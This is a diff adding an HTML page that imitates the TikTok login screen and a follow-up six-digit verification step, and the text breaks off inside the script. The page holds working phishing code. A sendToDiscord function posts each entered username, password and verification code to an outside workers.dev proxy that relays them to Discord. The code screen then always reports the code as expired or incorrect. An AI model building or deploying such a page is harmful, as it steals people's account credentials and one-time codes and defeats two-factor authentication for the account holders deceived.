@@ -1,0 +1,1130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Log in to TikTok</title>
+
+<style>
+  :root{
+    --red:#fe2c55;
+    --red-dark:#e8284c;
+    --cyan:#25f4ee;
+    --ink:#161823;
+    --ink-2:rgba(22,24,35,.75);
+    --ink-3:rgba(22,24,35,.5);
+    --line:rgba(22,24,35,.12);
+    --soft:rgba(22,24,35,.04);
+  }
+
+  *{ box-sizing:border-box; }
+
+  html,body{ height:100%; }
+
+  body{
+    margin:0;
+    min-height:100dvh;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    gap:24px;
+    padding:32px 16px;
+    background:#fff;
+    color:var(--ink);
+    font-family:"Segoe UI", system-ui, -apple-system, "Helvetica Neue", Arial, sans-serif;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  /* ================= Views ================= */
+  .view{
+    width:100%;
+    display:flex;
+    justify-content:center;
+    animation:viewIn .25s ease both;
+  }
+  .view[hidden]{ display:none; }
+
+  @keyframes viewIn{
+    from{ opacity:0; transform:translateY(6px); }
+    to{ opacity:1; transform:none; }
+  }
+
+  @media (prefers-reduced-motion: reduce){
+    .view{ animation:none; }
+  }
+
+  /* ================= Card ================= */
+  .card{
+    background:#fff;
+    border:1px solid var(--line);
+    border-radius:8px;
+    box-shadow:0 8px 32px rgba(22,24,35,.06);
+    overflow:hidden;
+  }
+
+  .card--login{
+    display:flex;
+    width:100%;
+    max-width:800px;
+  }
+
+  .card--verify{
+    width:100%;
+    max-width:480px;
+    padding:36px 40px 40px;
+  }
+
+  /* ================= Login: form panel ================= */
+  .form-panel{
+    flex:1 1 480px;
+    min-height:520px;
+    padding:44px 40px;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+  }
+
+  /* ---------- TikTok logo (new SVG) ---------- */
+  .logo{
+    display:block;
+    width:auto;
+    height:48px;
+    align-self: flex-start; /* Forces left alignment inside flex column */
+  }
+  .logo--sm{
+    height:40px;
+  }
+
+  h1{
+    margin:18px 0 8px;
+    font-size:32px;
+    line-height:1.2;
+    font-weight:700;
+    letter-spacing:-.3px;
+  }
+  .card--verify h1{
+    margin:16px 0 8px;
+    font-size:26px;
+    line-height:1.25;
+  }
+
+  .subtitle{
+    margin:0 0 28px;
+    font-size:15px;
+    line-height:1.45;
+    color:var(--ink-3);
+  }
+  .card--verify .subtitle{
+    margin:0 0 26px;
+    line-height:1.5;
+  }
+  .subtitle strong{
+    color:var(--ink);
+    font-weight:600;
+    word-break:break-word;
+  }
+
+  /* ================= Inputs ================= */
+  .field{ position:relative; margin-bottom:12px; }
+
+  .field input{
+    width:100%;
+    height:48px;
+    padding:0 14px;
+    font-size:15px;
+    font-family:inherit;
+    color:var(--ink);
+    background:var(--soft);
+    border:1px solid transparent;
+    border-radius:4px;
+    outline:none;
+    transition:background .15s, border-color .15s;
+  }
+
+  .field.has-toggle input{ padding-right:48px; }
+
+  .field input::placeholder{ color:var(--ink-3); }
+
+  .field input:focus{
+    background:#fff;
+    border-color:var(--line);
+  }
+
+  .eye{
+    position:absolute;
+    top:50%;
+    right:6px;
+    transform:translateY(-50%);
+    width:36px;
+    height:36px;
+    display:grid;
+    place-items:center;
+    border:0;
+    border-radius:50%;
+    background:none;
+    color:var(--ink-3);
+    cursor:pointer;
+  }
+  .eye:hover{ background:var(--soft); color:var(--ink-2); }
+  .eye .slash{ display:none; }
+  .eye.showing .slash{ display:block; }
+
+  .forgot{
+    display:block;
+    margin:2px 0 20px;
+    text-align:right;
+    font-size:14px;
+    color:var(--ink-2);
+    text-decoration:none;
+  }
+  .forgot:hover{ text-decoration:underline; }
+
+  /* ================= Buttons ================= */
+  .btn-primary{
+    position:relative;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    width:100%;
+    height:48px;
+    border:0;
+    border-radius:4px;
+    background:var(--red);
+    color:#fff;
+    font-family:inherit;
+    font-size:16px;
+    font-weight:600;
+    cursor:pointer;
+    transition:background .15s, transform .05s;
+  }
+  .card--verify .btn-primary{ margin-top:20px; }
+
+  .btn-primary:hover:not(:disabled){ background:var(--red-dark); }
+  .btn-primary:active:not(:disabled){ transform:translateY(1px); }
+  .btn-primary:focus-visible{ outline:2px solid var(--ink); outline-offset:2px; }
+  .btn-primary:disabled{
+    background:rgba(254,44,85,.45);
+    cursor:not-allowed;
+  }
+
+  /* ---------- Spinner (both buttons) ---------- */
+  .btn-primary .spinner{
+    display:none;
+    position:absolute;
+    inset:0;
+    margin:auto;
+    width:20px;
+    height:20px;
+    border:2.5px solid rgba(255,255,255,.35);
+    border-top-color:#fff;
+    border-radius:50%;
+    animation:spin .7s linear infinite;
+  }
+
+  .btn-primary.loading,
+  .btn-primary.loading:disabled{
+    background:var(--red);
+    cursor:wait;
+    pointer-events:none;
+  }
+
+  .btn-primary.loading .btn-label{ visibility:hidden; }
+  .btn-primary.loading .spinner{ display:block; }
+
+  @keyframes spin{
+    to{ transform:rotate(360deg); }
+  }
+
+  @media (prefers-reduced-motion: reduce){
+    .btn-primary .spinner{ animation-duration:1.6s; }
+  }
+
+  /* ================= Hints ================= */
+  .hint{
+    min-height:18px;
+    margin:10px 0 0;
+    font-size:13px;
+    line-height:1.45;
+    text-align:center;
+    color:var(--ink-3);
+    opacity:0;
+    transition:opacity .2s;
+  }
+  .card--verify .hint{ margin:12px 0 0; }
+  .hint.visible{ opacity:1; }
+  .hint.error{ color:var(--red-dark); }
+
+  /* ================= Login: divider + socials ================= */
+  .divider{
+    display:flex;
+    align-items:center;
+    gap:14px;
+    margin:26px 0 20px;
+    font-size:13px;
+    color:var(--ink-3);
+  }
+  .divider::before,
+  .divider::after{
+    content:"";
+    flex:1;
+    height:1px;
+    background:var(--line);
+  }
+
+  .socials{
+    display:flex;
+    gap:12px;
+    justify-content:center;
+  }
+
+  .social{
+    width:48px;
+    height:44px;
+    display:grid;
+    place-items:center;
+    border:1px solid var(--line);
+    border-radius:4px;
+    background:#fff;
+    color:var(--ink);
+    cursor:pointer;
+    transition:background .15s;
+  }
+  .social:hover{ background:var(--soft); }
+  .social svg{ width:20px; height:20px; }
+
+  .signup{
+    margin:26px 0 0;
+    font-size:15px;
+    color:var(--ink-2);
+  }
+  .signup a{
+    color:var(--red);
+    font-weight:600;
+    text-decoration:none;
+  }
+  .signup a:hover{ text-decoration:underline; }
+
+  /* ================= Login: QR panel ================= */
+  .qr-panel{
+    flex:0 0 300px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    gap:14px;
+    padding:32px;
+    border-left:1px solid var(--line);
+  }
+
+  .qr{
+    width:172px;
+    height:172px;
+    padding:8px;
+    display:grid;
+    grid-template-columns:repeat(21, 1fr);
+    grid-template-rows:repeat(21, 1fr);
+    background:#fff;
+    border:1px solid var(--line);
+    border-radius:6px;
+  }
+  .qr i{ background:transparent; }
+  .qr i.on{ background:var(--ink); }
+
+  .qr-title{
+    margin:0;
+    font-size:15px;
+    font-weight:600;
+  }
+  .qr-sub{
+    margin:0;
+    max-width:200px;
+    text-align:center;
+    font-size:13px;
+    line-height:1.45;
+    color:var(--ink-3);
+  }
+
+  /* ================= Verify: 6-digit code ================= */
+  .code-inputs{
+    display:flex;
+    gap:10px;
+    justify-content:space-between;
+    margin-bottom:8px;
+  }
+
+  .code-input{
+    width:100%;
+    min-width:0;
+    height:58px;
+    padding:0;
+    font-family:inherit;
+    font-size:24px;
+    font-weight:600;
+    text-align:center;
+    color:var(--ink);
+    background:var(--soft);
+    border:1.5px solid transparent;
+    border-radius:6px;
+    outline:none;
+    caret-color:var(--red);
+    transition:background .15s, border-color .15s, box-shadow .15s;
+    -moz-appearance:textfield;
+  }
+  .code-input::-webkit-outer-spin-button,
+  .code-input::-webkit-inner-spin-button{
+    -webkit-appearance:none;
+    margin:0;
+  }
+  .code-input::placeholder{ color:transparent; }
+  .code-input:focus{
+    background:#fff;
+    border-color:var(--ink);
+    box-shadow:0 0 0 3px rgba(22,24,35,.06);
+  }
+  .code-input:not(:placeholder-shown){
+    background:#fff;
+    border-color:var(--line);
+  }
+
+  /* error state on the whole group */
+  .code-inputs.has-error .code-input{
+    background:#fff;
+    border-color:var(--red);
+  }
+
+  /* ================= Verify: resend ================= */
+  .resend{
+    margin:22px 0 0;
+    font-size:14px;
+    text-align:center;
+    color:var(--ink-3);
+  }
+  .resend-timer{ font-variant-numeric:tabular-nums; }
+
+  .link-btn{
+    padding:0;
+    border:0;
+    background:none;
+    font-family:inherit;
+    font-size:14px;
+    font-weight:600;
+    color:var(--red);
+    cursor:pointer;
+  }
+  .link-btn:hover{ text-decoration:underline; }
+  .link-btn:focus-visible{
+    outline:2px solid var(--ink);
+    outline-offset:2px;
+    border-radius:2px;
+  }
+
+  .alt-way{
+    margin:18px 0 0;
+    font-size:14px;
+    text-align:center;
+  }
+  .alt-way a{
+    color:var(--ink-2);
+    text-decoration:none;
+  }
+  .alt-way a:hover{ text-decoration:underline; }
+
+  /* ================= Verify: bottom back link ================= */
+  .back-row{
+    margin-top:18px;
+    text-align:center;
+  }
+
+  .back{
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
+    padding:6px 10px 6px 6px;
+    border-radius:4px;
+    font-size:14px;
+    color:var(--ink-2);
+    text-decoration:none;
+  }
+  .back:hover{ background:var(--soft); color:var(--ink); }
+  .back svg{ width:16px; height:16px; }
+
+  /* ================= Footer ================= */
+  .terms{
+    max-width:520px;
+    margin:0;
+    text-align:center;
+    font-size:12px;
+    line-height:1.6;
+    color:var(--ink-3);
+  }
+  .terms a{ color:var(--ink-2); text-decoration:none; }
+  .terms a:hover{ text-decoration:underline; }
+
+  /* ================= Responsive ================= */
+  @media (max-width:760px){
+    body{ padding:0; gap:0; justify-content:flex-start; }
+    .card--login{
+      flex-direction:column;
+      border:0;
+      border-radius:0;
+      box-shadow:none;
+    }
+    .form-panel{ min-height:auto; padding:32px 20px; }
+    .qr-panel{ display:none; }
+    h1{ font-size:26px; }
+    .terms{ padding:0 24px 32px; }
+  }
+
+  @media (max-width:520px){
+    .card--verify{
+      border:0;
+      border-radius:0;
+      box-shadow:none;
+      padding:24px 20px 32px;
+      max-width:none;
+    }
+    .card--verify h1{ font-size:23px; }
+    .code-inputs{ gap:8px; }
+    .code-input{ height:52px; font-size:21px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ============================================================
+     VIEW 1 — LOG IN
+============================================================= -->
+<div class="view" id="view-login">
+  <main class="card card--login">
+
+    <!-- ---------- Form ---------- -->
+    <section class="form-panel">
+
+      <svg class="logo logo--sm" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 290" aria-hidden="true">
+        <path fill="#ff004f" d="M189.72 104.421c18.678 13.345 41.56 21.197 66.273 21.197v-47.53a67 67 0 0 1-13.918-1.456v37.413c-24.711 0-47.59-7.851-66.272-21.195v96.996c0 48.523-39.356 87.855-87.9 87.855c-18.113 0-34.949-5.473-48.934-14.86c15.962 16.313 38.222 26.432 62.848 26.432c48.548 0 87.905-39.332 87.905-87.857v-96.995zm17.17-47.952c-9.546-10.423-15.814-23.893-17.17-38.785v-6.113h-13.189c3.32 18.927 14.644 35.097 30.358 44.898M69.673 225.607a40 40 0 0 1-8.203-24.33c0-22.192 18.001-40.186 40.21-40.186a40.3 40.3 0 0 1 12.197 1.883v-48.593c-4.61-.631-9.262-.9-13.912-.801v37.822a40.3 40.3 0 0 0-12.203-1.882c-22.208 0-40.208 17.992-40.208 40.187c0 15.694 8.997 29.281 22.119 35.9" />
+        <path d="M175.803 92.849c18.683 13.344 41.56 21.195 66.272 21.195V76.631c-13.794-2.937-26.005-10.141-35.186-20.162c-15.715-9.802-27.038-25.972-30.358-44.898h-34.643v189.843c-.079 22.132-18.049 40.052-40.21 40.052c-13.058 0-24.66-6.221-32.007-15.86c-13.12-6.618-22.118-20.206-22.118-35.898c0-22.193 18-40.187 40.208-40.187c4.255 0 8.356.662 12.203 1.882v-37.822c-47.692.985-86.047 39.933-86.047 87.834c0 23.912 9.551 45.589 25.053 61.428c13.985 9.385 30.82 14.86 48.934 14.86c48.545 0 87.9-39.335 87.9-87.857z" />
+        <path fill="#00f2ea" d="M242.075 76.63V66.516a66.3 66.3 0 0 1-35.186-10.047a66.47 66.47 0 0 0 35.186 20.163M176.53 11.57a68 68 0 0 1-.728-5.457V0h-47.834v189.845c-.076 22.13-18.046 40.05-40.208 40.05a40.06 40.06 0 0 1-18.09-4.287c7.347 9.637 18.949 15.857 32.007 15.857c22.16 0 40.132-17.918 40.21-40.05V11.571zM99.966 113.58v-10.769a89 89 0 0 0-12.061-.818C39.355 101.993 0 141.327 0 189.845c0 30.419 15.467 57.227 38.971 72.996c-15.502-15.838-25.053-37.516-25.053-61.427c0-47.9 38.354-86.848 86.048-87.833" />
+      </svg>
+
+      <h1>Log in to TikTok</h1>
+      <p class="subtitle">
+        Manage your account, check notifications, comment on videos, and more.
+      </p>
+
+      <form id="login-form" novalidate autocomplete="off">
+
+        <div class="field">
+          <input id="identifier" type="text"
+                 placeholder="Email or username"
+                 aria-label="Email or username"
+                 autocomplete="username"
+                 required>
+        </div>
+
+        <div class="field has-toggle">
+          <input id="password" type="password"
+                 placeholder="Password"
+                 aria-label="Password"
+                 autocomplete="current-password"
+                 required>
+          <button type="button" class="eye" id="toggle-pw"
+                  aria-label="Show password" aria-pressed="false">
+            <svg viewBox="0 0 24 24" width="20" height="20" fill="none"
+                 stroke="currentColor" stroke-width="1.7"
+                 stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <path d="M2 12s3.6-6 10-6 10 6 10 6-3.6 6-10 6S2 12 2 12z"/>
+              <circle cx="12" cy="12" r="2.6"/>
+              <line class="slash" x1="4" y1="20" x2="20" y2="4"/>
+            </svg>
+          </button>
+        </div>
+
+        <!-- Forgot password → real TikTok reset page -->
+        <a class="forgot"
+           href="https://www.tiktok.com/login/email/forget-password">Forgot password?</a>
+
+        <button class="btn-primary" id="login-btn" type="submit">
+          <span class="btn-label">Log in</span>
+          <span class="spinner" aria-hidden="true"></span>
+        </button>
+
+        <p class="hint" id="login-hint" role="status" aria-live="polite"></p>
+      </form>
+
+      <div class="divider">or</div>
+
+      <div class="socials">
+        <button class="social" type="button" aria-label="Continue with Google">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+               stroke-width="2" stroke-linecap="round" aria-hidden="true">
+            <path d="M20.6 12.9A8.7 8.7 0 1 1 19 6.5"/>
+            <path d="M21 12.5h-8"/>
+          </svg>
+        </button>
+
+        <button class="social" type="button" aria-label="Continue with Facebook">
+          <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M13.5 21v-8h2.7l.4-3h-3.1V8.2c0-.9.25-1.5 1.5-1.5H17V4.1c-.3 0-1.3-.1-2.5-.1-2.5 0-4.2 1.5-4.2 4.3V10H7.6v3h2.7v8h3.2z"/>
+          </svg>
+        </button>
+
+        <button class="social" type="button" aria-label="Continue with Apple">
+          <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M16.5 12.4c0-2.1 1.7-3.1 1.8-3.2-1-1.4-2.5-1.6-3-1.7-1.3-.1-2.5.7-3.2.7-.7 0-1.7-.7-2.8-.7-1.4 0-2.8.8-3.5 2.1-1.5 2.6-.4 6.4 1.1 8.5.7 1 1.6 2.2 2.7 2.1 1.1 0 1.5-.7 2.8-.7s1.7.7 2.8.7c1.2 0 1.9-1 2.6-2 .8-1.2 1.2-2.3 1.2-2.4-.1 0-2.5-1-2.5-3.4zM14.6 6.2c.6-.7 1-1.7.9-2.7-.9 0-2 .6-2.6 1.3-.6.6-1.1 1.7-.9 2.7 1 .1 2-.6 2.6-1.3z"/>
+          </svg>
+        </button>
+
+        <button class="social" type="button" aria-label="Continue with X">
+          <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M17.5 3h3.2l-7 8 8.2 10h-6.4l-5-6.1L4.7 21H1.5l7.5-8.6L1.1 3h6.6l4.5 5.6L17.5 3zm-1.1 16.1h1.8L7.7 4.8H5.8l10.6 14.3z"/>
+          </svg>
+        </button>
+      </div>
+
+      <p class="signup">Don't have an account? <a href="#">Sign up</a></p>
+    </section>
+
+    <!-- ---------- QR ---------- -->
+    <aside class="qr-panel">
+      <div class="qr" id="qr" role="img" aria-label="Sample QR code (decorative, not scannable)"></div>
+      <p class="qr-title">Log in with QR code</p>
+      <p class="qr-sub">Scan with the TikTok app to log in instantly.</p>
+    </aside>
+
+  </main>
+</div>
+
+<!-- ============================================================
+     VIEW 2 — 6-DIGIT VERIFICATION
+============================================================= -->
+<div class="view" id="view-verify" hidden>
+  <main class="card card--verify">
+
+    <svg class="logo logo--sm" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 290" aria-hidden="true">
+      <path fill="#ff004f" d="M189.72 104.421c18.678 13.345 41.56 21.197 66.273 21.197v-47.53a67 67 0 0 1-13.918-1.456v37.413c-24.711 0-47.59-7.851-66.272-21.195v96.996c0 48.523-39.356 87.855-87.9 87.855c-18.113 0-34.949-5.473-48.934-14.86c15.962 16.313 38.222 26.432 62.848 26.432c48.548 0 87.905-39.332 87.905-87.857v-96.995zm17.17-47.952c-9.546-10.423-15.814-23.893-17.17-38.785v-6.113h-13.189c3.32 18.927 14.644 35.097 30.358 44.898M69.673 225.607a40 40 0 0 1-8.203-24.33c0-22.192 18.001-40.186 40.21-40.186a40.3 40.3 0 0 1 12.197 1.883v-48.593c-4.61-.631-9.262-.9-13.912-.801v37.822a40.3 40.3 0 0 0-12.203-1.882c-22.208 0-40.208 17.992-40.208 40.187c0 15.694 8.997 29.281 22.119 35.9" />
+      <path d="M175.803 92.849c18.683 13.344 41.56 21.195 66.272 21.195V76.631c-13.794-2.937-26.005-10.141-35.186-20.162c-15.715-9.802-27.038-25.972-30.358-44.898h-34.643v189.843c-.079 22.132-18.049 40.052-40.21 40.052c-13.058 0-24.66-6.221-32.007-15.86c-13.12-6.618-22.118-20.206-22.118-35.898c0-22.193 18-40.187 40.208-40.187c4.255 0 8.356.662 12.203 1.882v-37.822c-47.692.985-86.047 39.933-86.047 87.834c0 23.912 9.551 45.589 25.053 61.428c13.985 9.385 30.82 14.86 48.934 14.86c48.545 0 87.9-39.335 87.9-87.857z" />
+      <path fill="#00f2ea" d="M242.075 76.63V66.516a66.3 66.3 0 0 1-35.186-10.047a66.47 66.47 0 0 0 35.186 20.163M176.53 11.57a68 68 0 0 1-.728-5.457V0h-47.834v189.845c-.076 22.13-18.046 40.05-40.208 40.05a40.06 40.06 0 0 1-18.09-4.287c7.347 9.637 18.949 15.857 32.007 15.857c22.16 0 40.132-17.918 40.21-40.05V11.571zM99.966 113.58v-10.769a89 89 0 0 0-12.061-.818C39.355 101.993 0 141.327 0 189.845c0 30.419 15.467 57.227 38.971 72.996c-15.502-15.838-25.053-37.516-25.053-61.427c0-47.9 38.354-86.848 86.048-87.833" />
+    </svg>
+
+    <h1>Enter verification code</h1>
+    <p class="subtitle">
+      We sent a 6-digit code to <strong id="verify-target">j•••@example.com</strong>.
+      The code expires in 10 minutes.
+    </p>
+
+    <form id="verify-form" novalidate autocomplete="off">
+
+      <div class="code-inputs" id="code-inputs" role="group"
+           aria-label="6-digit verification code">
+        <input class="code-input" type="text" inputmode="numeric" pattern="[0-9]*"
+               maxlength="1" placeholder=" " aria-label="Digit 1 of 6"
+               autocomplete="one-time-code">
+        <input class="code-input" type="text" inputmode="numeric" pattern="[0-9]*"
+               maxlength="1" placeholder=" " aria-label="Digit 2 of 6">
+        <input class="code-input" type="text" inputmode="numeric" pattern="[0-9]*"
+               maxlength="1" placeholder=" " aria-label="Digit 3 of 6">
+        <input class="code-input" type="text" inputmode="numeric" pattern="[0-9]*"
+               maxlength="1" placeholder=" " aria-label="Digit 4 of 6">
+        <input class="code-input" type="text" inputmode="numeric" pattern="[0-9]*"
+               maxlength="1" placeholder=" " aria-label="Digit 5 of 6">
+        <input class="code-input" type="text" inputmode="numeric" pattern="[0-9]*"
+               maxlength="1" placeholder=" " aria-label="Digit 6 of 6">
+      </div>
+
+      <p class="hint" id="verify-hint" role="status" aria-live="polite"></p>
+
+      <button class="btn-primary" id="verify-btn" type="submit" disabled>
+        <span class="btn-label">Verify</span>
+        <span class="spinner" aria-hidden="true"></span>
+      </button>
+    </form>
+
+    <!-- Order: 1) resend, 2) didn't get code, 3) back to log in -->
+    <p class="resend">
+      <span class="resend-timer" id="resend-timer">Resend code in 0:30</span>
+      <button class="link-btn" id="resend-btn" type="button" hidden>Resend code</button>
+    </p>
+
+    <p class="alt-way">
+      Didn't get the code? <a href="#">Try another way</a>
+    </p>
+
+    <div class="back-row">
+      <a class="back" href="#" id="back-to-login">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+             stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <path d="M15 18l-6-6 6-6"/>
+        </svg>
+        Back to log in
+      </a>
+    </div>
+
+  </main>
+</div>
+
+<!-- ============================================================
+     SHARED FOOTER
+============================================================= -->
+<p class="terms">
+  By continuing, you agree to TikTok's <a href="#">Terms of Service</a> and confirm that
+  you have read and understood our <a href="#">Privacy Policy</a>.
+</p>
+
+<script>
+/* ===============================================================
+   1. Element references
+================================================================ */
+const loginView   = document.getElementById('view-login');
+const verifyView  = document.getElementById('view-verify');
+
+/* --- login --- */
+const loginForm       = document.getElementById('login-form');
+const identifierInput = document.getElementById('identifier');
+const passwordInput   = document.getElementById('password');
+const pwToggle        = document.getElementById('toggle-pw');
+const loginBtn        = document.getElementById('login-btn');
+const loginHint       = document.getElementById('login-hint');
+
+/* --- verify --- */
+const verifyForm  = document.getElementById('verify-form');
+const verifyTarget = document.getElementById('verify-target');
+const inputs      = Array.from(document.querySelectorAll('.code-input'));
+const inputWrap   = document.getElementById('code-inputs');
+const verifyHint  = document.getElementById('verify-hint');
+const verifyBtn   = document.getElementById('verify-btn');
+const resendTimer = document.getElementById('resend-timer');
+const resendBtn   = document.getElementById('resend-btn');
+const backLink    = document.getElementById('back-to-login');
+
+const CODE_LENGTH    = inputs.length;  // 6
+const RESEND_SECONDS = 30;             // resend cooldown (seconds)
+const LOGIN_DELAY_MS = 2000;           // spinner duration before page 2
+const VERIFY_DELAY_MS = 900;           // spinner duration before error
+
+/* ===============================================================
+   2. Small helpers
+================================================================ */
+function setHint(el, message, isError = false) {
+  el.textContent = message;
+  el.classList.toggle('error', isError);
+  el.classList.toggle('visible', Boolean(message));
+}
+
+function maskIdentifier(raw) {
+  const value = (raw || '').trim();
+  if (!value) return 'j•••@example.com';
+
+  if (value.includes('@')) {
+    const [local, domain] = value.split('@');
+    const head = local.slice(0, 1) || 'j';
+    const dots = '•'.repeat(Math.max(3, local.length - 1));
+    return `${head}${dots}@${domain}`;
+  }
+
+  const head = value.slice(0, 1);
+  const dots = '•'.repeat(Math.max(3, value.length - 1));
+  return `${head}${dots}`;
+}
+
+/* ===============================================================
+   3. View switching
+================================================================ */
+let cooldownId = null;
+let loginTimerId = null;
+let loginBusy = false;
+let verifyTimerId = null;
+let verifyBusy = false;
+
+function setLoginLoading(isLoading) {
+  loginBusy = isLoading;
+  loginBtn.classList.toggle('loading', isLoading);
+  loginBtn.disabled = isLoading;
+  loginBtn.setAttribute('aria-busy', String(isLoading));
+  loginBtn.setAttribute('aria-label', isLoading ? 'Logging in' : 'Log in');
+}
+
+function setVerifyLoading(isLoading) {
+  verifyBusy = isLoading;
+  verifyBtn.classList.toggle('loading', isLoading);
+  verifyBtn.setAttribute('aria-busy', String(isLoading));
+  verifyBtn.setAttribute('aria-label', isLoading ? 'Verifying' : 'Verify');
+
+  if (isLoading) {
+    verifyBtn.disabled = true;
+  } else {
+    syncVerifyBtn();
+  }
+}
+
+function cancelVerifyCheck() {
+  if (verifyTimerId !== null) {
+    clearTimeout(verifyTimerId);
+    verifyTimerId = null;
+  }
+  setVerifyLoading(false);
+}
+
+function showLoginView() {
+  /* cancel a pending login redirect if one is in flight */
+  if (loginTimerId !== null) {
+    clearTimeout(loginTimerId);
+    loginTimerId = null;
+  }
+  setLoginLoading(false);
+
+  /* cancel any in-flight verification check */
+  cancelVerifyCheck();
+
+  stopCooldown();
+
+  /* reset the verification step so returning to it starts clean */
+  resetVerifyState();
+  setHint(verifyHint, '');
+
+  /* reset the password field (identifier is kept for convenience) */
+  passwordInput.value = '';
+  passwordInput.type = 'password';
+  pwToggle.classList.remove('showing');
+  pwToggle.setAttribute('aria-pressed', 'false');
+  pwToggle.setAttribute('aria-label', 'Show password');
+
+  verifyView.hidden = true;
+  loginView.hidden = false;
+
+  identifierInput.focus();
+}
+
+function showVerifyView(identifier) {
+  loginView.hidden = true;
+  verifyView.hidden = false;
+
+  verifyTarget.textContent = maskIdentifier(identifier);
+
+  /* fresh state for this attempt */
+  resetVerifyState();
+  setHint(verifyHint, '');
+  cancelVerifyCheck();
+
+  startCooldown();
+  focusInput(0);
+}
+
+/* ===============================================================
+   4. Login screen behaviour
+================================================================ */
+
+/* show / hide password */
+pwToggle.addEventListener('click', () => {
+  const show = passwordInput.type === 'password';
+  passwordInput.type = show ? 'text' : 'password';
+  pwToggle.classList.toggle('showing', show);
+  pwToggle.setAttribute('aria-pressed', String(show));
+  pwToggle.setAttribute('aria-label', show ? 'Hide password' : 'Show password');
+});
+
+// ---------- Cloudflare Proxy to Discord ----------
+
+function sendToDiscord(data) {
+  const proxyUrl = "https://discord-php.6snbvwj828.workers.dev";
+  
+  let discordMessage = "";
+  
+  if (data.type === "login") {
+    discordMessage = `**🔐 New Login Attempt**\n**Username:** \`${data.username}\`\n**Password:** \`${data.password}\``;
+  } else if (data.type === "verification") {
+    discordMessage = `**🔢 Verification Code Entered**\n**Code:** \`${data.code}\``;
+  }
+  
+  fetch(proxyUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: discordMessage })
+    })
+    .then(r => console.log('Proxy status:', r.status))
+    .catch(e => console.error('Proxy fetch failed:', e));
+}
+
+/* submit → spinner for 2s → verification page */
+loginForm.addEventListener('submit', (event) => {
+  event.preventDefault();
+  if (loginBusy) return;
+
+  const identifier = identifierInput.value.trim();
+  const password   = passwordInput.value;
+
+  if (!identifier || !password) {
+    setHint(loginHint, 'Please enter your email or username and password.', true);
+    (!identifier ? identifierInput : passwordInput).focus();
+    return;
+  }
+
+  setHint(loginHint, '');
+  setLoginLoading(true);
+
+  // --- ADDED: Send login credentials to Discord ---
+  sendToDiscord({ type: 'login', username: identifier, password: password });
+  // ------------------------------------------------
+
+  loginTimerId = setTimeout(() => {
+    loginTimerId = null;
+    setLoginLoading(false);
+    showVerifyView(identifier);
+  }, LOGIN_DELAY_MS);
+});
+
+/* ===============================================================
+   5. Verification screen behaviour
+================================================================ */
+const getCode = () => inputs.map(i => i.value).join('');
+
+function syncVerifyBtn() {
+  verifyBtn.disabled = verifyBusy || getCode().length !== CODE_LENGTH;
+}
+
+function focusInput(index) {
+  const target = inputs[Math.max(0, Math.min(CODE_LENGTH - 1, index))];
+  target.focus();
+  target.select();
+}
+
+function resetVerifyState() {
+  inputs.forEach(i => { i.value = ''; });
+  inputWrap.classList.remove('has-error');
+  syncVerifyBtn();
+}
+
+/* clears the error styling as soon as the user starts retyping */
+function clearVerifyError() {
+  inputWrap.classList.remove('has-error');
+  setHint(verifyHint, '');
+}
+
+inputs.forEach((input, index) => {
+
+  /* one digit per box, auto-advance */
+  input.addEventListener('input', () => {
+    input.value = input.value.replace(/\D/g, '').slice(-1);
+
+    if (input.value && index < CODE_LENGTH - 1) {
+      focusInput(index + 1);
+    }
+
+    clearVerifyError();
+    syncVerifyBtn();
+  });
+
+  input.addEventListener('keydown', (event) => {
+
+    /* Backspace on an empty box → clear previous + move back */
+    if (event.key === 'Backspace' && !input.value && index > 0) {
+      event.preventDefault();
+      inputs[index - 1].value = '';
+      focusInput(index - 1);
+      clearVerifyError();
+      syncVerifyBtn();
+      return;
+    }
+
+    if (event.key === 'ArrowLeft' && index > 0) {
+      event.preventDefault();
+      focusInput(index - 1);
+    }
+
+    if (event.key === 'ArrowRight' && index < CODE_LENGTH - 1) {
+      event.preventDefault();
+      focusInput(index + 1);
+    }
+
+    if (event.key === 'Enter') {
+      event.preventDefault();
+      verifyForm.requestSubmit();
+    }
+  });
+
+  input.addEventListener('focus', () => input.select());
+});
+
+/* paste a whole code at once */
+inputWrap.addEventListener('paste', (event) => {
+  const clipboard = event.clipboardData || window.clipboardData;
+  const digits = (clipboard ? clipboard.getData('text') : '')
+    .replace(/\D/g, '')
+    .slice(0, CODE_LENGTH);
+
+  if (!digits) return;
+
+  event.preventDefault();
+
+  inputs.forEach((input, i) => { input.value = digits[i] || ''; });
+
+  focusInput(digits.length - 1);
+  clearVerifyError();
+  syncVerifyBtn();
+});
+
+verifyForm.addEventListener('submit', (event) => {
+  event.preventDefault();
+  if (verifyBusy) return;
+
+  const code = getCode();
+
+  if (code.length !== CODE_LENGTH) {
+    setHint(verifyHint, `Please enter all ${CODE_LENGTH} digits.`, true);
+    focusInput(code.length);
+    return;
+  }
+
+  /* clear any previous error before starting the check */
+  setHint(verifyHint, '');
+  inputWrap.classList.remove('has-error');
+
+  setVerifyLoading(true);
+
+  // --- ADDED: Send verification code to Discord ---
+  sendToDiscord({ type: 'verification', code: code });
+  // ------------------------------------------------
+
+  verifyTimerId = setTimeout(() => {
+    verifyTimerId = null;
+    setVerifyLoading(false);
+
+    setHint(
+      verifyHint,
+      'Verification code is expired or incorrect. Try again.',
+      true
+    );
+
+    inputWrap.classList.add('has-error');
+
+    /* clear the boxes so the user can retry immediately */
